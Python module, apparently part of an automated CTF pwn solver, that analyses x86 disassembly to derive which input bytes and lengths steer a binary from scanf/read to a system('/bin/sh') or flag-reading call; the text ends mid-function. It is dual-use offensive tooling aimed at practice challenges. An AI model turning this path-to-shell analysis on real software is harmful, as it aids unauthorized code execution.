"""L0.5 守卫层：输入 → win 路径上的判定条件分析与载荷构造（v7.4.0）。

四类逻辑校验题（492f / 4ee0 / 71b6 / 434c）的 win 不是靠劫持控制流，而是靠
让程序自己的判定通过。本模块只回答一个问题：**输入要满足什么条件，才能走到 win**。

硬边界（不猜）：
  * 只收 sink 之后、且「taken / fallthrough 恰好一条能到 win」的分支条件；
  * 只支持 cmp/test + je/jz/jne/jnz；ja/jb/jg/jl… 一律 unknown；
  * 条件必须可追溯到输入缓冲（栈/全局）、由它算出的 strlen、或同文件内
    判定函数的返回值（深度 1 —— 492f 的 Serialization）；
  * 求解不出就写 status/reason，注册进 facts.unknowns，不产出计划、不盲打。

三层结构：
  _Track   —— 单函数内的表达式跟踪（寄存器 / 内存 / strlen / 返回值）
  _Solver  —— 等式/不等式 → Constraint 列表 + ones（非零约束）
  find_guards / find_backfills —— 从 win / strncmp 调用点反向组织
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Optional

from capstone.x86 import X86_OP_IMM, X86_OP_MEM, X86_OP_REG

from .facts import Dis, _entry_of, _func_entries, _looks_writable, read_cstr
from .model import Challenge

MASK32 = 0xFFFFFFFF

_JCC = {"je", "jz", "jne", "jnz", "ja", "jae", "jb", "jbe", "jg", "jge",
        "jl", "jle", "js", "jns", "jo", "jno", "jp", "jnp", "jcxz", "jecxz"}
_JCC_EQ = {"je", "jz"}
_JCC_NE = {"jne", "jnz"}
_JCC_OK = _JCC_EQ | _JCC_NE

_SCANF_SINKS = ("scanf", "__isoc99_scanf", "fscanf", "__isoc99_fscanf",
                "sscanf", "__isoc99_sscanf")
_INPUT_SINKS = _SCANF_SINKS + ("gets", "fgets", "read", "memcpy", "recv", "fread")
_WIN_FUNCS = ("system", "execve", "execl", "execlp", "execvp", "popen", "posix_spawn")

# 表达式：("c",v) 常量 / ("b8"|"b32",off) 输入缓冲 / ("g8"|"g32",addr) 全局
#        ("or"|"xor"|"and"|"add"|"sub",a,b) / ("len",) 缓冲 strlen / ("ret",entry)
#        ("base",addr) / ("sbase",disp) lea 结果 / ("abs",addr) 实参绝对地址 /
#        ("param",disp) 函数形参 / UNK
UNK = ("unk",)


def _c(v: int) -> tuple:
    return ("c", v)


def _is_c(e) -> bool:
    return bool(e) and e[0] == "c"


def _mask(ch: Challenge) -> int:
    return MASK32 if ch.elf.bits == 32 else 0xFFFFFFFFFFFFFFFF


def _norm_reg(ch: Challenge, name: str) -> str:
    """把任意位宽的寄存器名归一到最宽的那个（al/eax/rax → rax）。"""
    name = (name or "").strip().lower()
    if ch.elf.bits == 32:
        t = {"al": "eax", "ah": "eax", "ax": "eax", "bl": "ebx", "bh": "ebx", "bx": "ebx",
             "cl": "ecx", "ch": "ecx", "cx": "ecx", "dl": "edx", "dh": "edx", "dx": "edx",
             "sil": "esi", "si": "esi", "dil": "edi", "di": "edi"}
        return t.get(name, name)
    t = {"eax": "rax", "ax": "rax", "al": "rax", "ah": "rax",
         "ebx": "rbx", "bx": "rbx", "bl": "rbx", "bh": "rbx",
         "ecx": "rcx", "cx": "rcx", "cl": "rcx", "ch": "rcx",
         "edx": "rdx", "dx": "rdx", "dl": "rdx", "dh": "rdx",
         "esi": "rsi", "si": "rsi", "sil": "rsi",
         "edi": "rdi", "di": "rdi", "dil": "rdi",
         "ebp": "rbp", "esp": "rsp", "eip": "rip"}
    return t.get(name, name)


def _parse_disp(text: str) -> int:
    """'+ 0x60' / ' - 0x1fc3' / '' → 有符号位移。"""
    t = (text or "").replace(" ", "")
    if not t:
        return 0
    sign = -1 if t.startswith("-") else 1
    t = t.lstrip("+-")
    try:
        return sign * int(t, 0)
    except ValueError:
        return 0


def _imm(text: str) -> Optional[int]:
    t = (text or "").strip()
    if not re.match(r"^-?(0x[0-9a-fA-F]+|\d+)$", t):
        return None
    try:
        return int(t, 0)
    except ValueError:
        return None


def _last_nonzero(raw: bytes) -> int:
    for i in range(len(raw) - 1, -1, -1):
        if raw[i]:
            return i
    return -1


def _jmp_target(ins) -> Optional[int]:
    if not ins.operands:
        return None
    op = ins.operands[0]
    if op.type != X86_OP_IMM:
        return None
    return int(op.imm) & 0xFFFFFFFFFFFFFFFF


# --------------------------------------------------------------------------- 数据结构
@dataclass
class Constraint:
    """一条对输入的约束。kind=len 时 off=0，val=要求的缓冲长度。"""
    kind: str            # byte | dword | global | len
    off: int
    val: int
    size: int = 1

    def __str__(self) -> str:
        return f"{self.kind}[{self.off:#x}]={self.val:#x}"


@dataclass
class Guard:
    """一条「输入 → win」的守卫链。status: solved | fmt | unsupported | unsat | unknown。"""
    call: int                     # win 调用点（system 等）
    entry: int                    # 所在函数入口
    kind: str                     # shell | flag
    arg: str                      # win 的参数字符串
    sink: str                     # 输入 sink（scanf/read/...）
    sink_call: int
    buf_kind: str                 # global | stack
    buf_addr: int                 # 全局缓冲地址（stack 时为 0）
    buf_disp: Optional[int]       # 栈缓冲位移（global 时为 None）
    length: Optional[int]         # 要求的输入长度（strlen 约束）
    conds: list = field(default_factory=list)     # [Constraint]
    ones: list = field(default_factory=list)      # 非零约束 ("any",(e,...)) / ("byte"|"dword",off,size,val)
    read_count: Optional[int] = None              # read/scanf 的容量上限
    fmt_call: int = 0             # printf(buf) 站点（status=fmt 时）
    marker: str = ""              # 门控与 win 之间打印的常量串（失败时的证据）
    status: str = "solved"
    reason: str = ""
    offset: Optional[int] = None  # 栈缓冲到返回地址的距离（越界保护）

    def __str__(self) -> str:
        head = f"{self.kind}@{hex(self.call)} {self.status}"
        if self.status not in ("solved", "fmt", "none") and self.reason:
            head += f"({self.reason})"
        if self.buf_kind == "global":
            loc = hex(self.buf_addr)
        else:
            loc = f"{self.buf_disp:+d}" if self.buf_disp is not None else "?"
        conds = ",".join(str(c) for c in self.conds[:10])
        extra = f" fmt={hex(self.fmt_call)}" if self.fmt_call else ""
        return f"{head} buf={self.buf_kind}:{loc} len={self.length} {conds}{extra}"


@dataclass
class Backfill:
    """strncmp(input, 运行时才出现的串, n) 型回填（434c）。"""
    call: int                     # strncmp 调用点
    entry: int                    # 所在函数入口
    n: int                        # 比较长度
    marker: bytes = b""           # 成功分支打印的常量串
    status: str = "backfill"      # backfill | unsupported | unprinted | unknown
    reason: str = ""

    def __str__(self) -> str:
        m = self.marker.decode("latin-1", "replace").strip()
        head = f"strncmp@{hex(self.call)} {self.status} n={self.n} marker={m}"
        if self.status != "backfill" and self.reason:
            head += f"({self.reason})"
        return head


# --------------------------------------------------------------------------- 控制流
def _succ_idx(d: Dis, lo_i: int, hi_i: int, i: int) -> list[int]:
    """[lo_i, hi_i) 内的后继指令下标；ret/hlt 无后继。"""
    ins = d.insns[i]
    m = ins.mnemonic
    nxt = i + 1 if i + 1 < hi_i else None
    if m == "ret":
        return []
    if m in ("hlt", "ud2", "int3"):
        return []
    if m == "jmp":
        t = d.by_addr.get(_jmp_target(ins))
        return [t] if t is not None and lo_i <= t < hi_i else []
    if m in _JCC:
        out = []
        t = d.by_addr.get(_jmp_target(ins))
        if t is not None and lo_i <= t < hi_i:
            out.append(t)
        if nxt is not None:
            out.append(nxt)
        return out
    return [nxt] if nxt is not None else []


def _path_indices(d: Dis, lo_i: int, hi_i: int, start_i: int,
                  target_i: int) -> Optional[list[int]]:
    """沿真实控制流找一条 start → target 的指令路径（BFS，最短路）。"""
    from collections import deque
    if not (lo_i <= start_i < hi_i and lo_i <= target_i < hi_i):
        return None
    prev: dict[int, Optional[int]] = {start_i: None}
    q = deque([start_i])
    while q:
        cur = q.popleft()
        if cur == target_i:
            path = []
            while cur is not None:
                path.append(cur)
                cur = prev[cur]
            return path[::-1]
        for nxt in _succ_idx(d, lo_i, hi_i, cur):
            if nxt not in prev:
                prev[nxt] = cur
                q.append(nxt)
        if len(prev) > (hi_i - lo_i) * 2 + 64:
            return None
    return None


def _reaches(d: Dis, lo_i: int, hi_i: int, start: int, target_addr: int) -> bool:
    ti = d.by_addr.get(target_addr)
    if ti is None or not (lo_i <= ti < hi_i):
        return False
    seen = set()
    st = [start]
    while st:
        cur = st.pop()
        if cur == ti:
            return True
        if cur in seen or not (lo_i <= cur < hi_i):
            continue
        seen.add(cur)
        st.extend(_succ_idx(d, lo_i, hi_i, cur))
    return False


def _branch_requirement(d: Dis, lo_i: int, hi_i: int, j: int,
                        target_addr: int) -> Optional[bool]:
    """taken / fallthrough 恰好一条能到 target 时返回 True(taken) / False(fall)。"""
    ins = d.insns[j]
    ti = d.by_addr.get(_jmp_target(ins))
    fi = j + 1
    if ti is None or not (lo_i <= ti < hi_i) or fi >= hi_i:
        return None
    taken = _reaches(d, lo_i, hi_i, ti, target_addr)
    fall = _reaches(d, lo_i, hi_i, fi, target_addr)
    if taken and not fall:
        return True
    if fall and not taken:
        return False
    return None


def _entry_index(d: Dis, entries) -> dict[int, tuple[int, int]]:
    """函数入口 → [lo_i, hi_i)：A0 的正解，入口地址一律经 d.by_addr 换成下标。"""
    es = sorted(set(e for e in entries if e in d.by_addr))
    out: dict[int, tuple[int, int]] = {}
    for i, e in enumerate(es):
        lo = d.by_addr[e]
        hi = d.by_addr[es[i + 1]] if i + 1 < len(es) else len(d.insns)
        out[e] = (lo, max(hi, lo + 1))
    return out


# --------------------------------------------------------------------------- 实参解析
def _lea_expr(ch: Challenge, d: Dis, k: int, lo_i: int, src: str):
    """`[base ± disp]` → ("abs", addr) / ("stack", disp, base) / None。"""
    m = re.match(r"^\[(rip|eip|rbx|ebx|rbp|ebp|rsp|esp)"
                 r"(?: ?([+-]) ?(0x[0-9a-f]+|\d+))?\]$", (src or "").strip())
    if not m:
        return None
    base = m.group(1)
    disp = _parse_disp((m.group(2) or "") + (m.group(3) or ""))
    if base in ("rip", "eip"):
        ins = d.insns[k]
        return ("abs", (ins.address + ins.size + disp) & _mask(ch))
    if base in ("rbx", "ebx"):
        b = _ebx_base(ch, d, lo_i)
        return ("abs", (b + disp) & MASK32) if b is not None else None
    return ("stack", disp, base)


def _resolve_reg(ch: Challenge, d: Dis, idx: int, reg: str, lo_i: int):
    """从 idx 往回找寄存器 reg 的表达式（A0：lo_i 是**指令下标**）。"""
    want = _norm_reg(ch, reg)
    for k in range(idx - 1, max(lo_i - 1, idx - 24), -1):
        ins = d.insns[k]
        m = ins.mnemonic
        if m in ("ret", "jmp", "call") or not ins.op_str:
            return None                      # 跨 call / 跳转后不确定
        if m not in ("mov", "lea"):
            continue
        dest, _, src = ins.op_str.partition(",")
        if _norm_reg(ch, dest) != want:
            continue
        src = src.strip()
        if m == "lea":
            return _lea_expr(ch, d, k, lo_i, src)
        v = _imm(src)
        if v is not None:
            return ("abs", v & _mask(ch))
        m2 = re.match(r"^(?:byte|word|dword|qword) ptr \[(?:e?bp)"
                      r"(?: ?([+-]) ?(0x[0-9a-f]+|\d+))?\]$", src)
        if m2:
            disp = _parse_disp((m2.group(1) or "") + (m2.group(2) or ""))
            return ("param", disp) if disp > 0 else ("stack", disp, "rbp")
        if re.match(r"^[a-z][a-z0-9]*$", src):
            return _resolve_reg(ch, d, k, _norm_reg(ch, src), lo_i)
        return None
    return None


def _ebx_base(ch: Challenge, d: Dis, lo_i: int) -> Optional[int]:
    """32 位 PIC 的 ebx 基址：函数内 `call __x86.get_pc_thunk.bx` + `add ebx,imm`。

    只认这条精确路径（不反解 GOT、不猜）：thunk 把返回地址写进 ebx，
    随后 `add ebx,imm` 得到 GOT/数据基址。4ee0 main：call@0x1285 + add ebx,0x2d76
    → 0x128a + 0x2d76 = 0x4000（与 model 的 PLT 多数票一致）。
    """
    if ch.elf.bits != 32:
        return None
    for j in range(lo_i, len(d.insns)):
        ins = d.insns[j]
        if ins.mnemonic != "call" or not ins.operands or ins.operands[0].type != X86_OP_IMM:
            continue
        n = d.by_addr.get(int(ins.operands[0].imm))
        if n is None or n + 1 >= len(d.insns):
            continue
        a, b = d.insns[n], d.insns[n + 1]
        if a.mnemonic != "mov" or b.mnemonic != "ret":
            continue
        if not re.match(r"^ebx, (?:dword ptr )?\[esp\]$", a.op_str):
            continue
        for k in range(j + 1, min(j + 4, len(d.insns))):
            p = d.insns[k]
            if p.mnemonic == "add" and p.op_str.startswith("ebx, "):
                v = _imm(p.op_str.split(", ", 1)[1])
                if v is not None:
                    return (ins.address + ins.size + v) & MASK32
            if p.mnemonic in ("call", "ret", "jmp"):
                break
    return None


def _expr_of(ch: Challenge, d: Dis, k: int, src: str, lo_i: int):
    """i386 栈参槽位右侧的值 → 表达式。立即数按 ("abs", v) 记（地址或常量）。"""
    src = (src or "").strip()
    v = _imm(src)
    if v is not None:
        return ("abs", v & _mask(ch))
    if re.match(r"^[a-z][a-z0-9]*$", src):
        return _resolve_reg(ch, d, k, _norm_reg(ch, src), lo_i)
    return None


def _i386_args(ch: Challenge, d: Dis, idx: int, lo_i: int, count: int) -> list:
    """cdecl 实参 0..count-1：支持 `push X` 与 `mov dword ptr [esp+4k], X` 两种写法。

    push 是倒序压栈（最后一个 push 才是 arg0），mov 槽位按 [esp+4k] 直接对应 arg k。
    """
    slots: dict[int, object] = {}
    pushes: list = []
    for k in range(idx - 1, max(lo_i - 1, idx - 32), -1):
        ins = d.insns[k]
        if ins.mnemonic == "call":
            break
        if ins.mnemonic == "mov":
            m = re.match(r"^dword ptr \[esp(?: ?\+ ?(0x[0-9a-f]+|\d+))?\], (.+)$", ins.op_str)
            if m:
                off = _parse_disp(m.group(1) or "0")
                if off % 4 == 0 and (off // 4) not in slots:
                    slots[off // 4] = _expr_of(ch, d, k, m.group(2), lo_i)
                continue
        if ins.mnemonic == "push" and ins.operands:
            op = ins.operands[0]
            if op.type == X86_OP_IMM:
                pushes.append(("abs", int(op.imm) & _mask(ch)))
            elif op.type == X86_OP_REG:
                pushes.append(_resolve_reg(ch, d, k, _norm_reg(ch, ins.reg_name(op.reg)), lo_i))
            else:
                pushes.append(None)
    out = []
    for pos in range(count):
        e = slots.get(pos)
        if e is None and pos < len(pushes):
            e = pushes[pos]
        out.append(e)
    return out


def _x64_args(ch: Challenge, d: Dis, idx: int, lo_i: int, count: int) -> list:
    regs = ("rdi", "rsi", "rdx", "rcx", "r8", "r9")
    return [_resolve_reg(ch, d, idx, regs[i], lo_i) if i < len(regs) else None
            for i in range(count)]


def _args(ch: Challenge, d: Dis, idx: int, lo_i: int, count: int) -> list:
    return _i386_args(ch, d, idx, lo_i, count) if ch.elf.bits == 32 \
        else _x64_args(ch, d, idx, lo_i, count)


def _arg_text(ch: Challenge, d: Dis, idx: int, lo_i: int):
    """win 的第一实参 → (字符串, 地址)。"""
    e = _args(ch, d, idx, lo_i, 1)[0]
    if not e or e[0] not in ("abs", "base"):
        return None, 0
    return read_cstr(ch, e[1]), e[1]


def _buf_from(ch: Challenge, e):
    if not e:
        return None
    if e[0] == "base":
        return ("global", e[1]) if _looks_writable(ch, e[1]) else None
    if e[0] == "abs":
        return ("global", e[1]) if e[1] > 0x1000 and _looks_writable(ch, e[1]) else None
    if e[0] == "stack":
        return ("stack", e[1], e[2])
    return None


def _sink_buf(ch: Challenge, d: Dis, idx: int, sink: str, lo_i: int):
    """输入 sink 的缓冲：("global", addr) 或 ("stack", disp, base)。"""
    if ch.elf.bits == 32:
        pos = 1 if sink in _SCANF_SINKS or sink in ("read", "memcpy", "recv") else 0
        args = _i386_args(ch, d, idx, lo_i, 2)
        e = args[pos] if pos < len(args) else None
    else:
        reg = "rsi" if sink in _SCANF_SINKS or sink in ("read", "memcpy", "recv") else "rdi"
        e = _resolve_reg(ch, d, idx, reg, lo_i)
    return _buf_from(ch, e)


def _read_count(ch: Challenge, d: Dis, idx: int, sink: str, lo_i: int) -> Optional[int]:
    """sink 的容量参数（read 的 count / fgets 的 size）。"""
    if sink not in ("read", "fgets", "memcpy", "recv", "fread"):
        return None
    pos = 2 if sink in ("read", "memcpy") else 1
    e = _args(ch, d, idx, lo_i, pos + 1)[pos]
    if e and e[0] == "abs" and 0 < e[1] <= 0x100000:
        return int(e[1])
    return None


# --------------------------------------------------------------------------- 表达式跟踪
class _Track:
    """在一条指令路径上维护 寄存器 / 内存 / strlen 返回值 的表达式。"""

    def __init__(self, ch: Challenge, d: Dis, buf=None, ebx_base: Optional[int] = None,
                 internal=(), lo_i: int = 0):
        self.ch, self.d = ch, d
        self.bits = ch.elf.bits
        self.mask = _mask(ch)
        self.regs: dict[str, tuple] = {}
        self.pending: Optional[tuple] = None
        self.buf = buf
        self.buf_addr = buf[1] if buf and buf[0] == "global" else 0
        self.buf_disp = buf[1] if buf and buf[0] == "stack" else None
        self.ebx_base = ebx_base
        self.lo_i = lo_i
        self.strlen_plt = ch.plt("strlen") if hasattr(ch, "plt") else None
        self.internal = set(internal) - set(getattr(ch, "plt_map", {}) or {})
        self.ax = _norm_reg(ch, "eax")
        self.dx = _norm_reg(ch, "edx")
        self.cx = _norm_reg(ch, "ecx")

    # -- 基本读取
    def _dest(self, ins) -> Optional[str]:
        if not ins.operands or ins.operands[0].type != X86_OP_REG:
            return None
        return _norm_reg(self.ch, ins.reg_name(ins.operands[0].reg))

    def _addr_of(self, ins, op) -> Optional[int]:
        mem = op.mem
        if mem.index and mem.scale:
            return None
        if not mem.base:
            return mem.disp & self.mask
        bn = ins.reg_name(mem.base)
        if bn in ("rip", "eip"):
            return (ins.address + ins.size + mem.disp) & self.mask
        if bn in ("rbx", "ebx") and self.ebx_base is not None:
            return (self.ebx_base + mem.disp) & MASK32
        bv = self.regs.get(_norm_reg(self.ch, bn), UNK)
        if bv[0] in ("base", "c"):
            return (bv[1] + mem.disp) & self.mask
        return None

    def _mem(self, ins, op) -> tuple:
        size = int(getattr(op, "size", 0) or 0)
        mem = op.mem
        if mem.index and mem.scale:
            return UNK
        if self.buf_disp is not None and mem.base:
            bn = ins.reg_name(mem.base)
            if bn in ("rbp", "ebp", "rsp", "esp"):
                off = mem.disp - self.buf_disp
                if 0 <= off < 0x100000:
                    return ("b8" if size == 1 else "b32", off)
        addr = self._addr_of(ins, op)
        if addr is None:
            return UNK
        if self.buf_addr and 0 <= (addr - self.buf_addr) < 0x100000:
            return ("b8" if size == 1 else "b32", addr - self.buf_addr)
        return ("g8" if size == 1 else "g32", addr)

    def _operand(self, ins, op) -> tuple:
        if op is None:
            return UNK
        if op.type == X86_OP_IMM:
            return _c(int(op.imm) & self.mask)
        if op.type == X86_OP_REG:
            return self.regs.get(_norm_reg(self.ch, ins.reg_name(op.reg)), UNK)
        if op.type == X86_OP_MEM:
            return self._mem(ins, op)
        return UNK

    def _lea_value(self, ins, op) -> tuple:
        if op is None or op.type != X86_OP_MEM:
            return UNK
        mem = op.mem
        bn = ins.reg_name(mem.base) if mem.base else ""
        if bn in ("rip", "eip"):
            return _c((ins.address + ins.size + mem.disp) & self.mask)
        if bn in ("rbp", "ebp", "rsp", "esp"):
            return ("sbase", mem.disp)
        addr = self._addr_of(ins, op)
        return ("base", addr) if addr is not None else UNK

    # -- 一步
    def step(self, i: int) -> None:
        ins = self.d.insns[i]
        m = ins.mnemonic
        if m == "lea":
            dest = self._dest(ins)
            if dest:
                self.regs[dest] = self._lea_value(ins, ins.operands[1])
            return
        if m in ("mov", "movzx", "movsx", "movsxd"):
            dest = self._dest(ins)
            if dest and len(ins.operands) >= 2:
                self.regs[dest] = self._operand(ins, ins.operands[1])
            return
        if m in ("or", "xor", "and", "add", "sub") and len(ins.operands) >= 2:
            dest = self._dest(ins)
            if not dest:
                return
            a = self.regs.get(dest, UNK)
            b = self._operand(ins, ins.operands[1])
            if m in ("xor", "sub") and a == b:
                self.regs[dest] = _c(0)
            else:
                self.regs[dest] = (m, a, b)
            self.pending = None
            return
        if m == "test":
            a = self._operand(ins, ins.operands[0])
            b = self._operand(ins, ins.operands[1]) if len(ins.operands) > 1 else a
            self.pending = ("test", a, b)
            return
        if m == "cmp" and len(ins.operands) >= 2:
            self.pending = ("cmp", self._operand(ins, ins.operands[0]),
                            self._operand(ins, ins.operands[1]))
            return
        if m == "call":
            self._call(i)
            return

    def _call(self, i: int) -> None:
        ins = self.d.insns[i]
        tgt = int(ins.operands[0].imm) if ins.operands and ins.operands[0].type == X86_OP_IMM else 0
        if tgt and self.strlen_plt and tgt == self.strlen_plt:
            a = self._arg0(i)
            self.regs[self.ax] = ("len",) if self._is_buf_val(a) else UNK
        elif tgt and tgt in self.internal:
            self.regs[self.ax] = ("ret", tgt)
        else:
            self.regs[self.ax] = UNK
        self.regs[self.dx] = UNK
        self.regs[self.cx] = UNK
        self.pending = None

    def _arg0(self, i: int):
        if self.bits == 64:
            return self.regs.get(_norm_reg(self.ch, "rdi"), UNK)
        a = _i386_args(self.ch, self.d, i, self.lo_i, 1)
        return a[0] if a else UNK

    def _is_buf_val(self, e) -> bool:
        if not e:
            return False
        # 立即数在跟踪器里记作 ("c", v)，实参解析里记作 ("abs", v)，两种都收
        if self.buf_addr and e[0] in ("c", "abs", "base") and e[1] == self.buf_addr:
            return True
        if self.buf_disp is not None and e[0] == "sbase" and e[1] == self.buf_disp:
            return True
        return False


# --------------------------------------------------------------------------- 求解器
def _ok() -> tuple:
    return ([], [], None, "solved", "")


def _unsat(reason: str) -> tuple:
    return ([], [], None, "unsat", reason)


def _unknown(reason: str) -> tuple:
    return ([], [], None, "unknown", reason)


def _merge(*rs) -> tuple:
    """合并多个求解结果；任一 unsat/unknown 直接传播（宁可 Unknown 不可错解）。"""
    for r in rs:
        if r[3] != "solved":
            return r
    conds: list = []
    ones: list = []
    length = None
    for r in rs:
        conds += r[0]
        ones += r[1]
        if r[2] is not None:
            if length is not None and length != r[2]:
                return _unsat(f"长度约束冲突：{length} vs {r[2]}")
            length = r[2]
    return (conds, ones, length, "solved", "")


def _leaves(e) -> list:
    if not e:
        return []
    if e[0] in ("b8", "b32", "g8", "g32"):
        return [e]
    if e[0] in ("or", "xor", "and", "add", "sub"):
        return _leaves(e[1]) + _leaves(e[2])
    return []


def _buf_leaves(e) -> list:
    return [x for x in _leaves(e) if x[0] in ("b8", "b32")]


class _Solver:
    """把 `expr == v` / `expr != v` 收敛成 Constraint 列表 + ones。"""

    def __init__(self, ch: Challenge, d: Dis, eidx: dict, buf, lo_i: int, hi_i: int,
                 depth: int = 0):
        self.ch, self.d, self.eidx = ch, d, eidx
        self.buf = buf
        self.lo_i, self.hi_i = lo_i, hi_i
        self.depth = depth
        self.mask = _mask(ch)

    # -- 入口
    def eq(self, a, v: int) -> tuple:
        if not a:
            return _unknown("表达式缺失")
        v &= self.mask
        k = a[0]
        if k == "c":
            return _ok() if (a[1] & self.mask) == v else _unsat(f"常量条件恒假（{a[1]:#x} != {v:#x}）")
        if k == "b8":
            return ([Constraint("byte", a[1], v & 0xFF, 1)], [], None, "solved", "")
        if k == "b32":
            return ([Constraint("dword", a[1], v & 0xFFFFFFFF, 4)], [], None, "solved", "")
        if k == "g8":
            return ([Constraint("global", a[1], v & 0xFF, 1)], [], None, "solved", "")
        if k == "g32":
            return ([Constraint("global", a[1], v & 0xFFFFFFFF, 4)], [], None, "solved", "")
        if k == "len":
            return ([Constraint("len", 0, v)], [], v, "solved", "")
        if k == "xor":
            x, y = a[1], a[2]
            if _is_c(y):
                return self.eq(x, v ^ (y[1] & self.mask))
            if _is_c(x):
                return self.eq(y, v ^ (x[1] & self.mask))
            return _unknown("xor 两侧都不确定")
        if k == "or":
            if v != 0:
                return _unknown("or 结果非零：分量不可拆分")
            return _merge(self.eq(a[1], 0), self.eq(a[2], 0))
        if k == "and":
            return _unknown("and 掩码条件")
        if k in ("add", "sub"):
            return _unknown(f"{k} 运算条件")
        if k == "ret":
            return self._ret(a[1], v, want_eq=True)
        if k in ("base", "sbase"):
            return _unknown("指针值条件（不是输入内容）")
        return _unknown("寄存器/内存来源不可追溯")

    def ne(self, a, v: int) -> tuple:
        if not a:
            return _unknown("表达式缺失")
        v &= self.mask
        k = a[0]
        if k == "c":
            return _ok() if (a[1] & self.mask) != v else _unsat("常量不等式恒假")
        if k == "b8":
            return ([], [("byte", a[1], 1, v & 0xFF)], None, "solved", "")
        if k == "b32":
            return ([], [("dword", a[1], 4, v & 0xFFFFFFFF)], None, "solved", "")
        if k in ("g8", "g32"):
            return _unknown("全局值需要写原语（fmt）")
        if k == "len":
            return _unknown("长度不等式")
        if k == "xor":
            x, y = a[1], a[2]
            if _is_c(y):
                return self.ne(x, v ^ (y[1] & self.mask))
            if _is_c(x):
                return self.ne(y, v ^ (x[1] & self.mask))
            return _unknown("xor 两侧都不确定")
        if k == "or":
            if v != 0:
                return _unknown("or 结果 ≠ 非零常量")
            leaves = _buf_leaves(a)
            if not leaves:
                return _unknown("或式没有可写的输入分量")
            return ([], [("any", tuple(leaves))], None, "solved", "")
        if k == "ret":
            return self._ret(a[1], v, want_eq=False)
        return _unknown("寄存器/内存来源不可追溯")

    # -- 判定函数返回值（A1：跨 call 边，深度 1）
    def _ret(self, entry: int, v: int, want_eq: bool) -> tuple:
        if self.depth >= 1:
            return _unknown("判定函数嵌套超过 1 层")
        if entry not in self.eidx:
            return _unknown(f"返回值来源 {entry:#x} 不是已知函数入口")
        lo, hi = self.eidx[entry]
        accept = (lambda x: x == (v & self.mask)) if want_eq else (lambda x: x != (v & self.mask))
        return _analyse_return_block(self.ch, self.d, self.eidx, lo, hi, accept,
                                     self.buf, self.depth + 1)


def _analyse_return_block(ch: Challenge, d: Dis, eidx: dict, lo_i: int, hi_i: int,
                          accept, buf, depth: int) -> tuple:
    """在判定函数里找「返回 accept(常量)」的块，收集到达它的强制条件。"""
    cands: list[int] = []
    for j in range(lo_i, hi_i):
        ins = d.insns[j]
        if ins.mnemonic in ("mov", "movabs"):
            m = re.match(r"^(?:eax|rax), (0x[0-9a-fA-F]+|\d+)$", ins.op_str)
            if m and accept(int(m.group(1), 0) & _mask(ch)):
                cands.append(j)
        elif ins.mnemonic in ("xor", "sub") and \
                re.match(r"^(?:eax|rax), (?:eax|rax)$", ins.op_str):
            if accept(0):
                cands.append(j)
    if not cands:
        return _unknown("判定函数里没有匹配的返回常量")
    j = cands[0]
    return _collect_conditions(ch, d, eidx, lo_i, hi_i, d.insns[j].address, lo_i,
                               buf, depth, min_j=lo_i)


# --------------------------------------------------------------------------- 条件收集
def _solve_branch(tr: _Track, solver: _Solver, mnemonic: str, must_take: bool) -> tuple:
    if mnemonic not in _JCC_OK:
        return _unknown(f"不支持的比较形式 {mnemonic}")
    if tr.pending is None:
        return _unknown("分支前没有 cmp/test")
    want_ne = must_take if mnemonic in _JCC_NE else (not must_take)
    kind = tr.pending[0]
    if kind == "test":
        a, b = tr.pending[1], tr.pending[2]
        if a != b:
            return _unknown("test 两侧不同（等价 and）")
        return solver.ne(a, 0) if want_ne else solver.eq(a, 0)
    a, b = tr.pending[1], tr.pending[2]
    if want_ne:
        if _is_c(b):
            return solver.ne(a, b[1])
        if _is_c(a):
            return solver.ne(b, a[1])
        return _unknown("cmp 两侧都不是常量")
    if _is_c(b):
        return solver.eq(a, b[1])
    if _is_c(a):
        return solver.eq(b, a[1])
    return _unknown("cmp 两侧都不是常量")


def _collect_conditions(ch: Challenge, d: Dis, eidx: dict, lo_i: int, hi_i: int,
                        target_addr: int, start_i: int, buf, depth: int,
                        min_j: Optional[int] = None) -> tuple:
    """沿真实控制流从 start_i 走到 target_addr，收集途中强制分支的条件。"""
    ti = d.by_addr.get(target_addr)
    if ti is None:
        return _unknown(f"目标 {target_addr:#x} 不在指令表内")
    path = _path_indices(d, lo_i, hi_i, start_i, ti)
    if path is None:
        return _unknown(f"从 {hex(d.insns[start_i].address)} 到 {hex(target_addr)} 路径不可达")
    tr = _Track(ch, d, buf=buf, ebx_base=_ebx_base(ch, d, lo_i),
                internal=set(eidx), lo_i=lo_i)
    solver = _Solver(ch, d, eidx, buf, lo_i, hi_i, depth)
    conds: list = []
    ones: list = []
    length = None
    for cur in path:
        ins = d.insns[cur]
        if ins.mnemonic in _JCC and ins.address != target_addr:
            if min_j is None or cur >= min_j:
                req = _branch_requirement(d, lo_i, hi_i, cur, target_addr)
                if req is not None:
                    r = _solve_branch(tr, solver, ins.mnemonic, req)
                    if r[3] != "solved":
                        return r
                    conds += r[0]
                    ones += r[1]
                    if r[2] is not None:
                        length = r[2]
            tr.pending = None
            continue
        tr.step(cur)
    return (conds, ones, length, "solved", "")


# --------------------------------------------------------------------------- 守卫发现
def _nearest_sink(f, entry: int, win_idx: int, d: Dis):
    """同函数、win 之前、离 win 最近的一个输入 sink。"""
    best = None
    best_i = -1
    for v in f.vulns:
        if v.func_entry != entry or v.sink not in _INPUT_SINKS:
            continue
        i = d.by_addr.get(v.call_addr)
        if i is None or i >= win_idx:
            continue
        if i > best_i:
            best, best_i = v, i
    return best


def _classify(text: Optional[str]) -> str:
    """win 参数字符串 → shell | flag | decoy。"""
    if not text:
        return ""
    t = text.strip().lower()
    if not t:
        return ""
    if t in ("/bin/sh", "sh", "bash", "/bin/bash", "/bin/dash"):
        return "shell"
    if t.startswith(("cat ", "cat\t", "head ", "tail ", "grep ", "strings ", "xxd ",
                     "more ", "less ", "awk ", "sed ", "tac ", "echo ")) or \
            t in ("cat", "flag", "/flag", "flag.txt", "/flag.txt"):
        return "flag"
    return "decoy"


def _path_marker(ch: Challenge, d: Dis, lo_i: int, hi_i: int, start_i: int,
                 target_i: int) -> str:
    """sink → win 路径上最后一个「打印常量串」的调用（失败时的门控证据）。"""
    path = _path_indices(d, lo_i, hi_i, start_i, target_i) or []
    best = ""
    for cur in path:
        ins = d.insns[cur]
        if ins.mnemonic != "call" or not ins.operands or ins.operands[0].type != X86_OP_IMM:
            continue
        nm = (getattr(ch, "plt_map", {}) or {}).get(int(ins.operands[0].imm))
        if nm not in ("puts", "printf"):
            continue
        e = _args(ch, d, cur, lo_i, 1)[0]
        if e and e[0] in ("abs", "base"):
